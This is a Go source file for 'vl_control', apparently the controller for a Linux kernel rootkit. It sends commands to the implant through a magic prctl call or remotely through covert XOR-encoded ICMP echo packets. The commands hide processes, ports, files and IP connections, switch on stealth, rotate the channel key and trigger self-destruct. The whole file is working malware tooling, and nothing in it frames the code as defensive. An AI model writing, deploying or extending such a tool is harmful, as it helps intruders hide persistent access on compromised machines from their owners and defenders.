package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const PRCTL_MAGIC = 0x564C

const (
	CMDHidePID      = 0x01
	CMDHidePort     = 0x02
	CMDHideFile     = 0x03
	CMDStealth      = 0x06
	CMDHideIP       = 0x12
	CMDHideIPPort   = 0x13
	CMDSetKey       = 0x20
	CMDSelfDestruct = 0xFE
	CMDClear        = 0xFF
)

var (
	defaultMagic = 49374
	defaultKey   = 0x42
)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "prctl":
		runPrctl(os.Args[2:])
	case "icmp":
		runIcmp(os.Args[2:])
	default:
		fmt.Fprintf(os.Stderr, "unknown mode: %s\n", os.Args[1])
		usage()
		os.Exit(1)
	}
}

func usage() {
	fmt.Println(`Usage: vl_control <mode> [options] <action> [args]

Modes:
  prctl   Local prctl control
  icmp    Remote ICMP control

Prctl actions:
  hide-port <port>
  hide-pid <pid>
  hide-file <prefix>
  hide-ip <ip>
  hide-ipport <ip> <port>
  clear
  stealth <0|1>
  self-destruct

ICMP options:
  --target <ip>     target IP (default 127.0.0.1)
  --magic <magic>   ICMP ID (default 49374)
  --key <key>       XOR key (default 0x42)
  --nping           force nping mode

ICMP actions:
  hide-port <port>
  hide-pid <pid>
  hide-file <prefix>
  hide-ip <ip>
  hide-ipport <ip> <port>
  set-key <new-magic> <new-key>
  clear
  stealth <0|1>
  self-destruct`)
}

// ===================== prctl mode =====================

func runPrctl(args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "Error: prctl action required")
		usage()
		os.Exit(1)
	}

	action := normalizeAction(args[0])
	tail := args[1:]

	var err error
	switch action {
	case "hide-port":
		err = prctlHidePort(tail)
	case "hide-pid":
		err = prctlHidePID(tail)
	case "hide-file":
		err = prctlHideFile(tail)
	case "hide-ip":
		err = prctlHideIP(tail)
	case "hide-ipport":
		err = prctlHideIPPort(tail)
	case "clear":
		err = prctlSimple(CMDClear, "All hidden items cleared")
	case "stealth":
		err = prctlStealth(tail)
	case "self-destruct":
		err = prctlSimple(CMDSelfDestruct, "Self-destruct initiated")
	default:
		fmt.Fprintf(os.Stderr, "Error: unknown prctl action '%s'\n", action)
		usage()
		os.Exit(1)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}
}

func prctlHidePort(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("hide-port requires a port")
	}
	port, err := strconv.ParseUint(args[0], 10, 16)
	if err != nil || port == 0 || port > 65535 {
		return fmt.Errorf("invalid port number (1-65535)")
	}
	if err := doPrctl(CMDHidePort, uintptr(port), 0, 0); err != nil {
		return fmt.Errorf("failed to hide port %d: %w", port, err)
	}
	fmt.Printf("[+] Port %d hidden successfully\n", port)
	return nil
}

func prctlHidePID(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("hide-pid requires a pid")
	}
	pid, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil || pid == 0 {
		return fmt.Errorf("invalid PID")
	}
	if err := doPrctl(CMDHidePID, uintptr(pid), 0, 0); err != nil {
		return fmt.Errorf("failed to hide pid %d: %w", pid, err)
	}
	fmt.Printf("[+] PID %d hidden successfully\n", pid)
	return nil
}

func prctlHideFile(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("hide-file requires a prefix")
	}
	prefix := args[0]
	b := append([]byte(prefix), 0)
	ptr := uintptr(unsafe.Pointer(&b[0]))
	err := doPrctl(CMDHideFile, ptr, 0, 0)
	runtime.KeepAlive(b)
	if err != nil {
		return fmt.Errorf("failed to hide files with prefix '%s': %w", prefix, err)
	}
	fmt.Printf("[+] Files with prefix '%s' hidden successfully\n", prefix)
	return nil
}

func prctlHideIP(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("hide-ip requires an IPv4 address")
	}
	ip, err := parseIPv4(args[0])
	if err != nil {
		return err
	}
	if err := doPrctl(CMDHideIP, uintptr(ip), 0, 0); err != nil {
		return fmt.Errorf("failed to hide IP %s: %w", args[0], err)
	}
	fmt.Printf("[+] IP %s hidden successfully\n", args[0])
	return nil
}

func prctlHideIPPort(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("hide-ipport requires ip and port")
	}
	ip, err := parseIPv4(args[0])
	if err != nil {
		return err
	}
	port, err := strconv.ParseUint(args[1], 10, 16)
	if err != nil || port == 0 || port > 65535 {
		return fmt.Errorf("invalid port number (1-65535)")
	}
	if err := doPrctl(CMDHideIPPort, uintptr(ip), uintptr(port), 0); err != nil {
		return fmt.Errorf("failed to hide %s:%d: %w", args[0], port, err)
	}
	fmt.Printf("[+] IP %s port %d hidden successfully\n", args[0], port)
	return nil
}

func prctlStealth(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("stealth requires 0 or 1")
	}
	enable, err := strconv.ParseUint(args[0], 10, 1)
	if err != nil || enable > 1 {
		return fmt.Errorf("use 0 (disable) or 1 (enable)")
	}
	if err := doPrctl(CMDStealth, uintptr(enable), 0, 0); err != nil {
		return fmt.Errorf("failed to set stealth mode: %w", err)
	}
	fmt.Printf("[+] Stealth mode %s\n", map[uint64]string{0: "disabled", 1: "enabled"}[enable])
	return nil
}

func prctlSimple(cmd uintptr, msg string) error {
	if err := doPrctl(cmd, 0, 0, 0); err != nil {
		return fmt.Errorf("%s failed: %w", msg, err)
	}
	fmt.Printf("[+] %s\n", msg)
	return nil
}

func doPrctl(cmd, arg, arg2, arg3 uintptr) error {
	ret, _, errno := syscall.Syscall6(syscall.SYS_PRCTL, PRCTL_MAGIC, cmd, arg, arg2, arg3, 0)
	if errno != 0 {
		return errno
	}
	if ret != 0 {
		return fmt.Errorf("prctl returned %d", ret)
	}
	return nil
}

// ===================== ICMP mode =====================

func runIcmp(args []string) {
	fs := flag.NewFlagSet("icmp", flag.ExitOnError)
	target := fs.String("target", "127.0.0.1", "target IP")
	magic := fs.Int("magic", defaultMagic, "ICMP ID")
	key := fs.Int("key", defaultKey, "XOR key")
	useNping := fs.Bool("nping", false, "force nping mode")
	fs.Parse(args)

	remaining := fs.Args()
	if len(remaining) < 1 {
		fmt.Fprintln(os.Stderr, "Error: icmp action required")
		usage()
		os.Exit(1)
	}

	if *magic < 0 || *magic > 0xFFFF {
		fmt.Fprintln(os.Stderr, "Error: invalid magic (0-65535)")
		os.Exit(1)
	}
	if *key < 0 || *key > 0xFF {
		fmt.Fprintln(os.Stderr, "Error: invalid key (0-255)")
		os.Exit(1)
	}

	action := normalizeAction(remaining[0])
	tail := remaining[1:]

	var payload []byte
	var err error
	k := byte(*key)
	switch action {
	case "hide-pid":
		payload, err = icmpHidePID(tail, k)
	case "hide-port":
		payload, err = icmpHidePort(tail, k)
	case "hide-file":
		payload, err = icmpHideFile(tail, k)
	case "hide-ip":
		payload, err = icmpHideIP(tail, k)
	case "hide-ipport":
		payload, err = icmpHideIPPort(tail, k)
	case "set-key":
		payload, err = icmpSetKey(tail, k)
	case "clear":
		payload, err = buildPayload(CMDClear, nil, k)
	case "stealth":
		payload, err = icmpStealth(tail, k)
	case "self-destruct":
		payload, err = buildPayload(CMDSelfDestruct, nil, k)
	default:
		fmt.Fprintf(os.Stderr, "Error: unknown icmp action '%s'\n", action)
		usage()
		os.Exit(1)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}

	if *useNping {
		err = sendNping(*target, *magic, payload)
	} else {
		err = sendICMP(*target, *magic, payload)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[*] raw socket failed (%v), falling back to nping\n", err)
			err = sendNping(*target, *magic, payload)
		}
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] failed to send ICMP command: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] ICMP command sent to %s (magic=0x%04x, key=0x%02x)\n", *target, *magic, *key)
}

func icmpHidePID(args []string, key byte) ([]byte, error) {
	if len(args) < 1 {
		return nil, fmt.Errorf("hide-pid requires a pid")
	}
	pid, err := strconv.ParseUint(args[0], 0, 32)
	if err != nil {
		return nil, fmt.Errorf("invalid pid")
	}
	data := pidBytes(uint32(pid))
	return buildPayload(CMDHidePID, data, key)
}

func icmpHidePort(args []string, key byte) ([]byte, error) {
	if len(args) < 1 {
		return nil, fmt.Errorf("hide-port requires a port")
	}
	port, err := strconv.ParseUint(args[0], 0, 16)
	if err != nil {
		return nil, fmt.Errorf("invalid port")
	}
	data := portBytes(uint16(port))
	return buildPayload(CMDHidePort, data, key)
}

func icmpHideFile(args []string, key byte) ([]byte, error) {
	if len(args) < 1 {
		return nil, fmt.Errorf("hide-file requires a prefix")
	}
	return buildPayload(CMDHideFile, []byte(args[0]), key)
}

func icmpHideIP(args []string, key byte) ([]byte, error) {
	if len(args) < 1 {
		return nil, fmt.Errorf("hide-ip requires an IPv4 address")
	}
	ip, err := parseIPv4(args[0])
	if err != nil {
		return nil, err
	}
	data := make([]byte, 4)
	binary.BigEndian.PutUint32(data, ip)
	return buildPayload(CMDHideIP, data, key)
}

func icmpHideIPPort(args []string, key byte) ([]byte, error) {
	if len(args) < 2 {
		return nil, fmt.Errorf("hide-ipport requires ip and port")
	}
	ip, err := parseIPv4(args[0])
	if err != nil {
		return nil, err
	}
	port, err := strconv.ParseUint(args[1], 0, 16)
	if err != nil {
		return nil, fmt.Errorf("invalid port")
	}
	data := make([]byte, 6)
	binary.BigEndian.PutUint32(data[:4], ip)
	binary.LittleEndian.PutUint16(data[4:6], uint16(port))
	return buildPayload(CMDHideIPPort, data, key)
}

func icmpSetKey(args []string, key byte) ([]byte, error) {
	if len(args) < 2 {
		return nil, fmt.Errorf("set-key requires <new-magic> <new-key>")
	}
	newMagic, err := strconv.ParseUint(args[0], 0, 16)
	if err != nil || newMagic > 0xFFFF {
		return nil, fmt.Errorf("invalid new-magic (0-65535)")
	}
	newKey, err := strconv.ParseUint(args[1], 0, 8)
	if err != nil || newKey > 0xFF {
		return nil, fmt.Errorf("invalid new-key (0-255)")
	}
	data := make([]byte, 3)
	binary.LittleEndian.PutUint16(data[:2], uint16(newMagic))
	data[2] = byte(newKey)
	return buildPayload(CMDSetKey, data, key)
}

func icmpStealth(args []string, key byte) ([]byte, error) {
	if len(args) < 1 {
		return nil, fmt.Errorf("stealth requires 0 or 1")
	}
	enable, err := strconv.ParseUint(args[0], 10, 1)
	if err != nil || enable > 1 {
		return nil, fmt.Errorf("use 0 (disable) or 1 (enable)")
	}
	return buildPayload(CMDStealth, []byte{byte(enable)}, key)
}

func buildPayload(cmd byte, data []byte, key byte) ([]byte, error) {
	if len(data) > 62 {
		return nil, fmt.Errorf("data length must be <= 62 bytes")
	}
	payload := make([]byte, 2+len(data))
	payload[0] = cmd
	payload[1] = byte(len(data))
	for i, b := range data {
		payload[2+i] = b ^ key
	}
	return payload, nil
}

func sendNping(target string, magic int, payload []byte) error {
	hexData := strings.ToUpper(hex.EncodeToString(payload))
	cmd := exec.Command("nping", "--icmp", "--icmp-id", strconv.Itoa(magic), "--data", hexData, target, "-c", "1")
	return cmd.Run()
}

func sendICMP(target string, magic int, payload []byte) error {
	var buf bytes.Buffer
	buf.WriteByte(8) // ICMP Echo Request
	buf.WriteByte(0) // Code
	buf.Write([]byte{0, 0}) // checksum placeholder
	binary.Write(&buf, binary.BigEndian, uint16(magic))
	binary.Write(&buf, binary.BigEndian, uint16(1))
	buf.Write(payload)

	packet := buf.Bytes()
	cs := icmpChecksum(packet)
	packet[2] = byte(cs >> 8)
	packet[3] = byte(cs)

	c, err := net.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer c.Close()

	dst, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		return err
	}

	_, err = c.WriteTo(packet, dst)
	return err
}

func icmpChecksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i < len(b)-1; i += 2 {
		sum += uint32(b[i])<<8 | uint32(b[i+1])
	}
	if len(b)%2 == 1 {
		sum += uint32(b[len(b)-1]) << 8
	}
	for (sum >> 16) != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return uint16(^sum)
}

// ===================== helpers =====================

func normalizeAction(s string) string {
	return strings.ReplaceAll(s, "_", "-")
}

func parseIPv4(s string) (uint32, error) {
	ip := net.ParseIP(s)
	if ip == nil {
		return 0, fmt.Errorf("invalid IPv4 address: %s", s)
	}
	ip = ip.To4()
	if ip == nil {
		return 0, fmt.Errorf("not an IPv4 address: %s", s)
	}
	return binary.BigEndian.Uint32(ip), nil
}

func portBytes(port uint16) []byte {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, port)
	return b
}

func pidBytes(pid uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, pid)
	return b
}
